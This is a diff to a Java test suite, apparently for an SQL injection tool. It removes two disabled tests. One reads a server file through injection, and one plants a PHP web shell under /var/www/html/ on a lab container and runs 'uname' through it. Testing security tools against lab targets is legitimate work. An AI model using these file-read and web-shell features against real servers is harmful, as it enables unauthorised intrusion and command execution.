@@ -315,30 +315,4 @@ public abstract class AbstractTestSuite {
             throw new AssertionError(String.format("Unknown values: %s\n%s", valuesUnknown, e));
         }
     }
-
-    @Ignore("Enabled on inherit")
-    public void readFile() throws JSqlException, ExecutionException, InterruptedException {
-
-        List<String> contents = this.injectionModel.getResourceAccess()
-            .readFile(Collections.singletonList("/var/lib/mysql-files/file-injection.txt"));
-
-        LOGGER.info("ReadFile: found {} to find {}", String.join(",", contents), "inside");
-
-        Assertions.assertEquals("inside", String.join(",", contents).trim());
-    }
-
-    @Ignore("Enabled on inherit")
-    public void webshell() throws JSqlException, InterruptedException {
-
-        this.injectionModel.getResourceAccess().createWebShell("/var/www/html/", "");
-        String resultCommand = this.injectionModel.getResourceAccess().runWebShell(
-            "uname",
-            UUID.randomUUID(),
-            "http://jsql-lamp:8079/."+ this.injectionModel.getVersionJsql() +".jw.php"
-        );
-
-        LOGGER.info("Webshell: found {} to find {}", resultCommand.trim(), "Linux");
-
-        Assertions.assertEquals("Linux", resultCommand.trim());
-    }
 }
